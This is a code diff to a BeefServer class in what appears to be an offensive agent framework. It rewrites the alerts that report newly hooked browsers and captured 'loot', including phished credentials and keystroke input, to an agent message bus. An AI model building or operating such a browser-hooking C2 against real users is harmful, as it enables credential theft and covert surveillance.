@@ -345,13 +345,11 @@ class BeefServer:
         if is_new:
             TELEMETRY.record_c2("beef_hook", f"NEW HOOKED BROWSER `{sid}` ({body.get('href', 'unknown')})", detail=body.get("ua", ""))
             try:
-                from agents.crew import CREW_BUS
-                CREW_BUS.say(
-                    "SWITCH",
-                    f"BOOM — LIVE ZOMBIE BROWSER HOOKED! Session `{sid}` just beaconed from `{body.get('href') or remote}` "
-                    f"(cookies={body.get('cookie_len', 0)}B, forms={body.get('forms', 0)})! Open the BeEF C2 tab boys!",
-                    kind="cheer",
-                    to="CREW",
+                from agents.agent import AGENT_BUS
+                AGENT_BUS.say(
+                    f"Browser hooked — session `{sid}` beaconed from `{body.get('href') or remote}` "
+                    f"(cookies={body.get('cookie_len', 0)}B, forms={body.get('forms', 0)}). BeEF C2 is live.",
+                    kind="info",
                 )
             except Exception:
                 pass
@@ -401,12 +399,11 @@ class BeefServer:
         TELEMETRY.record_c2("beef_cmd", f"BeEF LOOT CAPTURED (`{entry['kind']}`) from `{sid}`!", detail=json.dumps(entry["data"], default=str)[:180])
         if entry["kind"] in ("phished_credentials", "keystroke_input"):
             try:
-                from agents.crew import CREW_BUS
-                CREW_BUS.say(
-                    "SWITCH",
-                    f"HOLY SHIT — captured live `{entry['kind']}` loot from hooked browser `{sid}`: `{json.dumps(entry['data'], default=str)[:140]}`!!",
-                    kind="cheer",
-                    to="CHAINSAW",
+                from agents.agent import AGENT_BUS
+                AGENT_BUS.say(
+                    f"Captured `{entry['kind']}` loot from hooked browser `{sid}`: "
+                    f"`{json.dumps(entry['data'], default=str)[:140]}`",
+                    kind="info",
                 )
             except Exception:
                 pass
